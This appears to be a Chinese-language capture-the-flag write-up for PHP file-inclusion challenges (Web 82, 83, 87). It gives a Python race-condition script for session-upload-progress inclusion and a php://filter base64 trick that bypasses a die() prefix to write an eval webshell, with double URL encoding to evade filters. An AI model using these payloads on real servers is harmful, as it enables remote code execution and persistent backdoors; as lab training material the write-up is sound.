Web 82

<?php
    if(isset($_GET['file'])){

替换了php、data、：、.，伪协议、远程文件包含、日志文件包含都用不了

可以使用session文件包含，在上传文件的过程中，在Cookie中设置PHPSESSID=flag（默认情况下是用户自定义的name），同时上传包里带PHP_SESSION_UPLOAD_PROGRESS，PHP就会自动启用session，但是session.upload_progress.cleanup也是默认开启的，此时需要文件竞争，可以直接写脚本竞争，也可以利用bp的intruder模块进行竞争

  • 脚本
data-language
import io
import sys
import requests
import threading

sessid = ''
url = ''

def POST(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        session.post(
            url,
            data={"PHP_SESSION_UPLOAD_PROGRESS":"<?php ?>"},
            files={"file":('q.txt', f)},
            cookies={'PHPSESSID':sessid}
        )

def READ(session):
    while True:
        response = session.get(f'{url}?file=/tmp/sess_{sessid}')
        if '' not in response.text:
            print('[+++]retry')
        else:
            print(response.text)
            sys.exit(0)

with requests.session() as session:
    t1 = threading.Thread(target=POST, args=(session, ))
    t1.daemon = True
    t1.start()

    READ(session)

Web 83

<?php
    session_unset();
    session_destroy();

    if(isset($_GET['file'])){
        $file = $_GET['file'];
        $file = str_replace("php", "???", $file);
        $file = str_replace("data", "???", $file);
        $file = str_replace(":", "???", $file);
        $file = str_replace(".", "???", $file);
        include($file);
    }else{
        highlight_file(__FILE__);
    }

session_unset：释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件以及不释放对应的session
id

session_destory：删除当前用户对应的session文件以及释放session
id，内存中的$_SESSION变量内容依然保留

  • 方法同Web 82，只是增加了竞争难度

  • 成功条件：当两个释放函数结束后才创建session

Web 87

<?php
    if(isset($_GET['file'])){
        $file = $_GET['file'];
        $content = $_POST['content'];
        $file = str_replace("php", "???", $file);
        $file = str_replace("data", "???", $file);
        $file = str_replace(":", "???", $file);
        $file = str_replace(".", "???", $file);
        file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);
    }else{
        highlight_file(__FILE__);
    }

在文件头加入了死亡函数die()，我们传入的content在执行前会先执行die而退出脚本，所以本题的目的是绕过死亡函数

payload：url/?file=php://filter/wtire=convert.base64-decode/resource=1.php

post：content=<?php eval($_POST[‘a’]);?>

  • 在file_put_contents中file被url解码了，所以在传值时url编码两次可绕过str_replace

  • 一个正常的base64_decode可以理解为两个步骤

<?php
$_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']);
base64_decode($_GET['txt']);

所以在利用伪协议对其进行base64解码时，<、?、;、>、空格等七个不符合base64编码范围的字符将被忽略

可以理解为1.php中内容为phpdie+我们传入的值

base64算法解码时是4个byte一组，需要补充两个字符（补充的字符需要在base64编码范围内且不为=），这样我们传入的值才会被正常解码
